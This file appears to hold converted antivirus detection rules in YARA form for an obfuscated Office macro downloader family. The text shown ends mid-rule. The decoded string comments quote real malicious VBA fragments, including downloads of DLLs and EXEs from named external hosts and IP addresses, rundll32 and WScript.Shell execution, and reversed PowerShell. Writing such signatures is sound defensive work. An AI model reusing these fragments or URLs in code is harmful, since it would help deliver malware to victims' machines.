
rule TrojanDownloader_O97M_Obfuse_SS_MTB{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 65 6c 5f 68 48 } //01 00  = CreateObject(el_hH
		$a_01_1 = {2e 52 75 6e 28 49 42 53 59 5f 61 6c 34 6d 79 73 64 44 31 72 4d 4a 4a 4c 38 75 } //01 00  .Run(IBSY_al4mysdD1rMJJL8u
		$a_01_2 = {50 4d 61 44 39 62 74 7a 4d 45 5f 71 4e 48 73 6a 73 75 45 20 3d 20 5a 53 } //00 00  PMaD9btzME_qNHsjsuE = ZS
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {6b 61 6f 6b 73 64 6f 20 3d 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 7a 61 69 6d 2e 6a 73 22 } //01 00  kaoksdo = "C:\Users\Public\zaim.js"
		$a_01_1 = {53 68 65 65 74 31 2e 52 61 6e 67 65 20 28 22 4f 32 32 39 22 29 } //01 00  Sheet1.Range ("O229")
		$a_01_2 = {43 61 6c 6c 20 53 68 65 6c 6c 25 28 77 67 70 72 43 34 59 78 7a 63 6b 48 29 } //00 00  Call Shell%(wgprC4YxzckH)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_3{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 01 00 "
		
	strings :
		$a_01_0 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 20 30 26 2c 20 22 68 74 74 70 73 3a 2f 2f 66 69 67 65 73 6f 79 75 7a 6f 2e 63 6f 6d 2f 75 73 64 61 32 39 6b 73 61 67 68 31 32 2f 31 35 2e 64 6c 6c 22 2c 20 22 43 3a 5c 5c 55 73 65 72 73 5c 5c 50 75 62 6c 69 63 5c 5c 34 35 31 34 38 2e 65 78 65 } //00 00  URLDownloadToFile 0&, "https://figesoyuzo.com/usda29ksagh12/15.dll", "C:\\Users\\Public\\45148.exe
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_4{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {77 73 68 2e 52 75 6e 20 46 67 62 56 34 35 67 20 26 } //01 00  wsh.Run FgbV45g &
		$a_01_1 = {53 65 74 20 77 73 68 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 } //01 00  Set wsh = CreateObject("WScript.Shell")
		$a_03_2 = {20 3d 20 52 65 70 6c 61 63 65 28 90 02 0f 2c 20 22 90 02 0f 22 2c 20 22 22 29 90 0a 2f 00 90 1b 00 90 00 } //00 00 
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_5{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 01 00 "
		
	strings :
		$a_01_0 = {2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 22 50 22 20 2b 20 49 69 62 59 43 6d 6d 58 55 28 66 6a 6b 65 72 6f 6f 6f 73 29 2c 20 49 69 62 59 43 6d 6d 58 55 28 66 67 66 6a 68 66 67 66 67 29 2c 20 22 22 2c 20 22 22 2c 20 30 } //01 00  .ShellExecute "P" + IibYCmmXU(fjkerooos), IibYCmmXU(fgfjhfgfg), "", "", 0
		$a_01_1 = {49 69 62 59 43 6d 6d 58 55 20 3d 20 49 69 62 59 43 6d 6d 58 55 20 26 20 4d 69 64 28 73 2c 20 70 2c 20 31 29 } //00 00  IibYCmmXU = IibYCmmXU & Mid(s, p, 1)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_6{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {78 48 74 74 70 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 3a 2f 2f 31 36 37 2e 39 39 2e 35 30 2e 31 32 39 2f 63 68 61 72 6c 6f 74 74 65 2e 64 6c 6c 22 2c 20 46 61 6c 73 65 } //01 00  xHttp.Open "GET", "http://167.99.50.129/charlotte.dll", False
		$a_01_1 = {2e 73 61 76 65 74 6f 66 69 6c 65 20 22 43 3a 5c 54 65 6d 70 5c 63 68 61 72 6c 6f 74 74 65 2e 64 6c 6c 22 2c } //01 00  .savetofile "C:\Temp\charlotte.dll",
		$a_01_2 = {53 68 65 6c 6c 20 28 22 72 75 6e 64 6c 6c 33 32 20 43 3a 5c 54 65 6d 70 5c 63 68 61 72 6c 6f 74 74 65 2e 64 6c 6c 2c 20 76 4f 75 6f 76 4b 4d 6a 22 29 } //00 00  Shell ("rundll32 C:\Temp\charlotte.dll, vOuovKMj")
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_7{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 73 3a 2f 2f 66 69 6c 65 62 69 6e 2e 6e 65 74 2f 35 6d 73 36 6b 34 75 6e 6f 37 71 78 36 69 74 63 2f 66 6f 72 74 6e 69 74 65 2e 65 78 65 22 2c 20 46 61 6c 73 65 } //01 00  .Open "GET", "https://filebin.net/5ms6k4uno7qx6itc/fortnite.exe", False
		$a_01_1 = {2e 73 61 76 65 74 6f 66 69 6c 65 20 28 22 43 3a 5c 50 72 6f 67 72 61 6d 64 61 74 61 5c 66 6f 72 74 6e 69 74 65 2e 65 78 65 22 29 2c 20 32 } //01 00  .savetofile ("C:\Programdata\fortnite.exe"), 2
		$a_01_2 = {53 68 65 6c 6c 20 28 22 43 3a 5c 50 72 6f 67 72 61 6d 64 61 74 61 5c 46 6f 72 74 6e 69 74 65 2e 65 78 65 } //00 00  Shell ("C:\Programdata\Fortnite.exe
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_8{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {61 73 6e 20 3d 20 6d 6f 61 73 64 20 2b 20 61 73 64 6d 6d 6d 20 2b 20 61 73 64 6d 6d 6d 20 2b 20 6d 77 69 6d 78 20 2b 20 61 73 6d 64 69 61 73 64 20 2b 20 6d 61 73 } //01 00  asn = moasd + asdmmm + asdmmm + mwimx + asmdiasd + mas
		$a_01_1 = {6d 61 73 20 3d 20 22 2f 25 39 31 31 25 39 31 31 25 39 31 31 25 39 31 31 25 39 31 31 40 6a 2e 6d 70 5c 6b 61 73 61 73 64 73 64 73 61 73 64 61 73 64 64 } //01 00  mas = "/%911%911%911%911%911@j.mp\kasasdsdsasdasdd
		$a_01_2 = {6d 61 73 20 3d 20 22 2f 25 39 31 31 25 39 31 31 25 39 31 31 25 39 31 31 25 39 31 31 40 6a 2e 6d 70 5c 6b 61 73 61 73 78 61 6e 73 78 6e 61 73 78 69 64 73 6b 64 64 } //00 00  mas = "/%911%911%911%911%911@j.mp\kasasxansxnasxidskdd
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_9{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 01 00 "
		
	strings :
		$a_03_0 = {20 3d 20 45 6e 76 69 72 6f 6e 28 90 02 35 28 22 66 77 6a 73 45 6e 66 75 74 7a 54 22 29 29 20 26 20 45 6e 76 69 72 6f 6e 28 90 1b 00 28 22 69 75 62 51 66 6e 70 49 22 29 29 20 26 20 41 70 70 6c 69 63 61 74 69 6f 6e 2e 50 61 74 68 53 65 70 61 72 61 74 6f 72 20 26 20 90 1b 00 28 22 71 70 75 6c 74 66 45 22 29 20 26 20 41 70 70 6c 69 63 61 74 69 6f 6e 2e 50 61 74 68 53 65 70 61 72 61 74 6f 72 20 26 20 90 1b 00 28 22 6d 6d 65 2f 66 6e 62 6f 66 6d 6a 67 22 29 90 00 } //01 00 
		$a_01_1 = {44 6b 61 73 64 61 53 53 20 3d 20 22 72 75 6e 64 6c 6c 33 32 22 } //00 00  DkasdaSS = "rundll32"
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_10{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {73 6f 63 69 61 6c 77 6f 72 6c 64 20 3d 20 6f 6e 65 64 61 79 31 2e 6f 70 65 6e 61 6e 64 73 68 75 74 2e 54 61 67 20 2b 20 6f 6e 65 64 61 79 31 2e 62 75 74 74 6f 6e 2e 54 61 67 } //01 00  socialworld = oneday1.openandshut.Tag + oneday1.button.Tag
		$a_03_1 = {63 61 72 69 6e 74 65 72 66 61 63 65 5f 6e 61 6d 65 20 28 73 6f 66 74 63 6f 72 6e 65 72 29 90 02 03 53 68 65 6c 6c 20 69 5f 6e 61 6d 65 90 00 } //01 00 
		$a_01_2 = {61 73 73 61 73 2e 54 65 78 74 66 69 6c 65 } //01 00  assas.Textfile
		$a_03_3 = {44 69 6d 20 43 6c 6f 73 65 62 61 72 20 41 73 20 4e 65 77 20 73 6f 63 69 61 6c 90 02 03 43 6c 6f 73 65 62 61 72 2e 6f 70 65 6e 6d 6f 75 74 68 90 00 } //00 00 
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_11{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 01 00 "
		
	strings :
		$a_01_0 = {58 60 45 60 49 7c 27 27 20 6e 69 6f 6a 2d 20 6d 6a 24 3b 7d 29 29 36 31 2c 5f 24 28 36 31 74 6e 69 6f 74 3a 3a 5d 74 72 65 76 6e 6f 63 5b 28 5d 72 61 68 63 5b 7b 20 68 63 61 45 72 6f 66 20 7c 20 29 27 5f 27 28 74 69 6c 70 53 2e 73 72 61 68 43 69 69 63 73 61 24 3d 6d 6a 24 3b 27 39 32 5f 37 32 5f 33 37 5f 41 36 5f 45 32 5f 46 36 5f 34 37 5f 31 36 5f } //01 00  X`E`I|'' nioj- mj$;}))61,_$(61tniot::]trevnoc[(]rahc[{ hcaErof | )'_'(tilpS.srahCiicsa$=mj$;'92_72_37_A6_E2_F6_47_16_
		$a_01_1 = {3d 73 72 61 68 43 69 69 63 73 61 } //01 00  =srahCiicsa
		$a_01_2 = {24 20 6e 65 64 64 69 68 20 65 6c 79 74 53 77 6f } //01 00  $ neddih elytSwo
		$a_01_3 = {6c 6c 65 68 73 72 65 77 } //01 00  llehsrew
		$a_01_4 = {53 68 65 6c 6c 2e 41 70 70 6c 69 63 } //00 00  Shell.Applic
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_12{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 22 20 26 20 4d 69 64 28 22 39 63 72 69 70 74 2e 73 68 35 22 2c 20 32 2c 20 38 29 20 26 20 22 65 6c 6c 22 29 2e 52 75 6e 20 61 76 6f 69 64 6f 62 6a 65 63 74 2c 20 30 } //01 00  CreateObject("ws" & Mid("9cript.sh5", 2, 8) & "ell").Run avoidobject, 0
		$a_01_1 = {61 76 6f 69 64 6f 62 6a 65 63 74 20 3d 20 74 75 6d 72 68 75 6c 6e 74 74 6f 70 63 76 63 75 79 28 61 76 6f 69 64 6f 62 6a 65 63 74 20 26 20 74 68 65 72 65 74 72 61 69 6e 29 } //01 00  avoidobject = tumrhulnttopcvcuy(avoidobject & theretrain)
		$a_01_2 = {74 68 65 72 65 74 72 61 69 6e 20 3d 20 22 20 4a 59 25 5a 74 33 33 6d 6b 33 70 6b 25 38 36 5c 4c 79 52 33 72 36 52 78 52 74 5a 67 38 71 36 2e 52 65 42 6b 78 36 65 } //00 00  theretrain = " JY%Zt33mk3pk%86\LyR3r6RxRtZg8q6.ReBkx6e
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_13{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 01 00 "
		
	strings :
		$a_01_0 = {44 65 62 75 67 2e 50 72 69 6e 74 20 76 79 67 76 59 33 74 66 5f 39 49 41 6a 69 50 62 } //01 00  Debug.Print vygvY3tf_9IAjiPb
		$a_01_1 = {3d 20 4c 65 6e 28 4a 6f 69 6e 28 41 72 72 61 79 28 22 49 65 33 78 51 6b 55 59 62 73 56 67 48 35 44 6c 38 4f 30 33 64 48 51 41 6e 4d 73 } //01 00  = Len(Join(Array("Ie3xQkUYbsVgH5Dl8O03dHQAnMs
		$a_01_2 = {66 6b 63 32 4c 30 31 45 37 57 63 48 6e 69 41 63 6e 47 43 75 75 52 4d 43 43 62 6f 20 3d 20 22 72 49 65 45 77 47 6b 55 5a 79 6c 30 47 } //01 00  fkc2L01E7WcHniAcnGCuuRMCCbo = "rIeEwGkUZyl0G
		$a_01_3 = {26 20 22 54 76 35 75 4b 59 31 6d 48 72 55 66 66 76 4d } //01 00  & "Tv5uKY1mHrUffvM
		$a_01_4 = {4f 70 65 6e 20 58 78 30 4b 5a 4e 4e 5f 67 50 67 78 4c 70 41 5f 67 6d 44 64 47 65 44 20 46 6f 72 20 42 69 6e 61 72 79 20 41 73 20 23 43 4c 6e 67 28 } //00 00  Open Xx0KZNN_gPgxLpA_gmDdGeD For Binary As #CLng(
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_14{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 76 61 72 32 20 2b 20 4c 65 66 74 28 6b 61 7a 61 2c 20 32 29 20 2b 20 53 70 61 63 65 28 32 29 20 2b 20 68 61 6e 64 6c 61 6e 64 32 20 2b 20 22 70 3a 2f 2f 25 22 20 2b 20 48 61 6c 61 6c 20 2b 20 49 44 63 61 72 64 } //01 00  = var2 + Left(kaza, 2) + Space(2) + handland2 + "p://%" + Halal + IDcard
		$a_01_1 = {43 61 6c 6c 20 53 68 65 6c 6c 28 63 61 6c 63 2c 20 76 62 4e 6f 72 6d 61 6c 46 6f 63 75 73 29 } //01 00  Call Shell(calc, vbNormalFocus)
		$a_01_2 = {48 61 6c 61 6c 20 3d 20 22 32 30 25 32 30 25 32 30 25 32 30 32 30 25 32 30 32 30 25 32 30 32 30 25 32 30 32 30 25 32 30 40 62 69 22 20 26 20 53 74 72 69 6e 67 28 31 2c 20 22 74 22 29 20 2b 20 22 2e 22 20 2b 20 53 74 72 69 6e 67 28 31 2c 20 22 6c 22 29 20 2b 20 22 79 2f 22 } //00 00  Halal = "20%20%20%2020%2020%2020%2020%20@bi" & String(1, "t") + "." + String(1, "l") + "y/"
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_15{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 01 00 "
		
	strings :
		$a_01_0 = {41 70 70 6c 69 63 61 74 69 6f 6e 2e 53 65 6e 64 4b 65 79 73 20 22 25 28 71 74 6d 73 74 76 29 7b 45 4e 54 45 52 7d 22 } //01 00  Application.SendKeys "%(qtmstv){ENTER}"
		$a_01_1 = {45 72 72 2e 4e 75 6d 62 65 72 20 3d 20 31 30 30 34 } //01 00  Err.Number = 1004
		$a_01_2 = {70 74 68 31 20 3d 20 41 70 70 6c 69 63 61 74 69 6f 6e 2e 53 74 61 72 74 75 70 50 61 74 68 20 26 20 22 5c 62 6f 6f 73 74 69 6e 67 2e 78 6c 73 22 } //01 00  pth1 = Application.StartupPath & "\boosting.xls"
		$a_01_3 = {44 65 62 75 67 2e 50 72 69 6e 74 20 54 68 69 73 57 6f 72 6b 62 6f 6f 6b 2e 56 42 50 72 6f 6a 65 63 74 2e 56 42 43 6f 6d 70 6f 6e 65 6e 74 73 28 22 54 68 69 73 57 6f 72 6b 62 6f 6f 6b 22 29 } //01 00  Debug.Print ThisWorkbook.VBProject.VBComponents("ThisWorkbook")
		$a_01_4 = {2e 53 61 76 65 41 73 20 46 69 6c 65 6e 61 6d 65 3a 3d 70 74 68 31 } //00 00  .SaveAs Filename:=pth1
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_16{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 06 00 06 00 00 01 00 "
		
	strings :
		$a_01_0 = {69 6f 79 75 6b 69 75 20 3d 20 43 68 72 28 63 64 73 73 66 20 2d 20 31 31 36 29 } //01 00  ioyukiu = Chr(cdssf - 116)
		$a_01_1 = {43 53 44 43 44 53 20 3d 20 22 64 63 64 76 20 68 67 66 6e 20 6d 6a 68 67 6d 6a 22 } //01 00  CSDCDS = "dcdv hgfn mjhgmj"
		$a_03_2 = {3d 20 22 57 53 43 72 69 70 74 2e 73 68 65 6c 6c 22 0d 0a 53 65 74 20 90 02 38 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 90 00 } //01 00 
		$a_03_3 = {2e 52 75 6e 28 90 02 35 2c 20 90 02 32 29 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e 90 00 } //01 00 
		$a_01_4 = {67 74 65 72 67 74 20 3d 20 22 74 65 72 67 20 75 79 74 69 20 67 72 20 64 68 20 6a 79 20 66 65 } //01 00  gtergt = "terg uyti gr dh jy fe
		$a_01_5 = {50 44 46 4e 61 6d 65 20 3d 20 4c 65 66 74 28 70 70 74 4e 61 6d 65 2c 20 49 6e 53 74 72 28 70 70 74 4e 61 6d 65 2c 20 22 2e 22 29 29 20 26 20 22 70 64 66 } //00 00  PDFName = Left(pptName, InStr(pptName, ".")) & "pdf
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_17{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 22 50 22 20 2b 20 66 64 34 35 63 76 76 30 2c 20 66 67 66 6a 68 66 67 66 67 2c 20 22 22 2c 20 22 22 2c 20 30 } //01 00  .ShellExecute "P" + fd45cvv0, fgfjhfgfg, "", "", 0
		$a_03_1 = {53 65 74 20 90 02 04 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 53 68 65 6c 6c 2e 41 70 70 6c 69 63 61 74 69 6f 6e 22 29 90 00 } //01 00 
		$a_03_2 = {50 72 69 76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 90 02 03 27 4d 73 67 42 6f 78 27 4d 73 67 42 6f 78 90 00 } //01 00 
		$a_03_3 = {49 6e 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 90 02 03 49 66 20 90 02 08 2e 4e 61 6d 65 20 3d 20 22 43 6f 6d 6d 65 6e 74 73 22 20 54 68 65 6e 90 00 } //00 00 
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_18{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 05 00 00 01 00 "
		
	strings :
		$a_03_0 = {3d 20 22 57 53 43 72 69 70 74 2e 73 68 65 6c 6c 22 90 02 03 53 65 74 20 71 75 78 73 66 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 7a 61 63 6a 6b 6b 6b 68 7a 62 71 73 73 62 6a 79 78 69 29 90 00 } //01 00 
		$a_01_1 = {74 66 74 71 63 20 3d 20 71 75 78 73 66 2e 52 75 6e 28 70 6f 65 61 76 64 67 69 6c 6a 69 74 66 6f 7a 74 7a 6d 6b 68 6c 6c 7a 76 61 6d 6b 6f 68 2c 20 62 79 62 75 70 73 62 29 } //01 00  tftqc = quxsf.Run(poeavdgiljitfoztzmkhllzvamkoh, bybupsb)
		$a_01_2 = {69 6f 79 75 6b 69 75 20 3d 20 43 68 72 28 63 64 73 73 66 20 2d 20 31 31 36 29 } //01 00  ioyukiu = Chr(cdssf - 116)
		$a_01_3 = {68 66 66 20 3d 20 43 68 72 28 62 67 66 62 67 20 2d 20 31 31 34 29 } //02 00  hff = Chr(bgfbg - 114)
		$a_01_4 = {2e 52 75 6e 28 73 78 66 6c 6f 73 6a 77 77 6a 6e 6f 61 67 70 65 71 6c 77 69 6e 6b 2c 20 76 69 6b 77 71 79 68 61 72 72 6b 76 6e 69 6d 6d 76 69 71 74 70 68 78 68 78 70 6f 78 64 79 73 65 76 74 6a 29 } //00 00  .Run(sxflosjwwjnoagpeqlwink, vikwqyharrkvnimmviqtphxhxpoxdysevtj)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_19{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_03_0 = {43 72 65 61 74 65 50 72 6f 63 65 73 73 41 28 75 72 6c 2c 20 64 75 72 6c 2c 20 30 2c 20 30 2c 20 46 61 6c 73 65 2c 20 90 02 09 2c 20 30 2c 20 22 43 3a 5c 22 2c 20 73 69 2c 20 70 69 29 20 54 68 65 6e 90 00 } //01 00 
		$a_03_1 = {53 65 74 20 44 44 46 75 6e 63 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 90 02 35 28 22 75 64 66 6b 63 50 6e 66 75 74 7a 54 66 6d 6a 47 2f 68 6f 6a 75 71 6a 73 64 54 22 29 29 90 00 } //01 00 
		$a_03_2 = {45 78 69 73 74 73 20 3d 20 44 69 72 28 90 02 35 28 22 7a 73 70 75 64 66 73 6a 65 71 6e 75 5d 64 6a 6d 63 76 51 5d 74 73 66 74 56 5d 3b 44 22 29 2c 20 76 62 44 69 72 65 63 74 6f 72 79 29 90 00 } //01 00 
		$a_03_3 = {64 2e 43 72 65 61 74 65 46 6f 6c 64 65 72 20 90 02 35 28 22 7a 73 70 75 64 66 73 6a 65 71 6e 75 5d 64 6a 6d 63 76 51 5d 74 73 66 74 56 5d 3b 44 22 29 90 00 } //00 00 
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_20{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 07 00 00 01 00 "
		
	strings :
		$a_01_0 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 66 75 63 6b 7a 61 72 67 75 73 29 2e 45 78 65 63 20 6c 75 6c 69 31 20 2b 20 6c 75 6c 69 32 } //01 00  CreateObject(fuckzargus).Exec luli1 + luli2
		$a_01_1 = {79 61 7a 65 65 64 39 20 3d 20 22 33 22 20 2b 20 22 30 22 20 2b 20 22 39 22 } //01 00  yazeed9 = "3" + "0" + "9"
		$a_01_2 = {6c 75 6c 69 32 20 3d 20 79 61 7a 65 65 64 39 20 2b 20 79 61 7a 65 65 64 31 30 20 2b 20 79 61 7a 65 65 64 31 32 } //01 00  luli2 = yazeed9 + yazeed10 + yazeed12
		$a_01_3 = {79 61 7a 65 65 64 31 30 20 3d 20 22 34 22 20 2b 20 22 38 22 20 2b 20 22 40 22 20 2b 20 22 61 } //01 00  yazeed10 = "4" + "8" + "@" + "a
		$a_01_4 = {79 61 7a 65 65 64 31 32 20 3d 20 22 64 6e 6a 6b 73 } //01 00  yazeed12 = "dnjks
		$a_01_5 = {79 61 7a 65 65 64 31 32 20 3d 20 22 66 64 73 61 64 61 76 63 78 67 68 61 68 6b 68 73 22 20 2b 20 22 61 73 64 6a 64 72 73 61 61 64 } //01 00  yazeed12 = "fdsadavcxghahkhs" + "asdjdrsaad
		$a_01_6 = {79 61 7a 65 65 64 31 32 20 3d 20 22 66 64 64 61 73 68 64 6a 6b 73 61 61 73 78 27 22 20 2b 20 22 61 73 64 67 62 73 61 64 } //00 00  yazeed12 = "fddashdjksaasx'" + "asdgbsad
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_21{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,08 00 08 00 08 00 00 01 00 "
		
	strings :
		$a_03_0 = {53 65 74 20 90 02 0f 5f 90 02 0f 20 3d 20 47 65 74 4f 62 6a 65 63 74 28 90 02 70 29 2e 53 70 61 77 6e 49 6e 73 74 61 6e 63 65 5f 90 00 } //01 00 
		$a_01_1 = {2e 53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 43 4c 6e 67 28 28 } //01 00  .ShowWindow = CLng((
		$a_03_2 = {23 45 6e 64 20 49 66 90 02 04 50 72 69 76 61 74 65 20 43 6f 6e 73 74 20 90 02 0f 5f 90 02 0f 5f 90 02 0f 20 41 73 20 4c 6f 6e 67 20 3d 20 26 48 31 30 32 90 00 } //01 00 
		$a_03_3 = {44 65 62 75 67 2e 50 72 69 6e 74 20 90 02 0a 5f 90 00 } //01 00 
		$a_01_4 = {29 29 20 2a 20 52 6e 64 20 2b 20 43 4c 6e 67 28 28 } //01 00  )) * Rnd + CLng((
		$a_03_5 = {4f 70 65 6e 20 90 02 35 20 46 6f 72 20 42 69 6e 61 72 79 20 41 73 20 23 43 4c 6e 67 28 28 4e 6f 74 90 00 } //01 00 
		$a_01_6 = {2c 20 41 73 63 28 4c 65 66 74 24 28 4d 69 64 24 28 } //01 00  , Asc(Left$(Mid$(
		$a_01_7 = {41 6c 69 61 73 20 22 50 6f 73 74 4d 65 73 73 61 67 65 41 22 20 28 42 79 56 61 6c } //00 00  Alias "PostMessageA" (ByVal
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_22{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {6f 57 6f 72 64 44 6f 63 2e 53 61 76 65 41 73 20 73 50 61 74 68 20 2b 20 6d 5f 73 44 6f 63 50 72 65 66 69 78 20 2b 20 43 53 74 72 28 69 29 20 2b 20 22 2e 64 6f 63 22 } //01 00  oWordDoc.SaveAs sPath + m_sDocPrefix + CStr(i) + ".doc"
		$a_01_1 = {53 65 74 20 47 6f 74 63 68 61 73 20 3d 20 57 69 6c 64 63 61 72 64 2e 43 72 65 61 74 65 46 6f 6c 64 65 72 28 22 43 3a 5c 52 65 71 75 69 72 65 64 5c 6f 63 63 75 72 73 22 29 } //01 00  Set Gotchas = Wildcard.CreateFolder("C:\Required\occurs")
		$a_01_2 = {53 65 74 20 41 53 43 49 49 66 69 6c 65 20 3d 20 57 69 6c 64 63 61 72 64 2e 6f 70 65 6e 74 65 78 74 66 69 6c 65 28 22 43 3a 5c 52 65 71 75 69 72 65 64 5c 44 4f 4d 44 6f 63 75 6d 65 6e 74 2e 76 62 22 20 2b 20 22 73 22 2c 20 38 2c 20 31 29 } //01 00  Set ASCIIfile = Wildcard.opentextfile("C:\Required\DOMDocument.vb" + "s", 8, 1)
		$a_01_3 = {57 69 6c 64 63 61 72 64 2e 45 78 65 63 20 22 65 78 70 6c 6f 72 65 72 2e 65 78 65 20 43 3a 5c 52 65 71 75 69 72 65 64 5c 44 4f 4d 44 6f 63 75 6d 65 6e 74 2e 76 62 22 20 2b 20 22 73 22 } //00 00  Wildcard.Exec "explorer.exe C:\Required\DOMDocument.vb" + "s"
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_23{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 06 00 06 00 00 01 00 "
		
	strings :
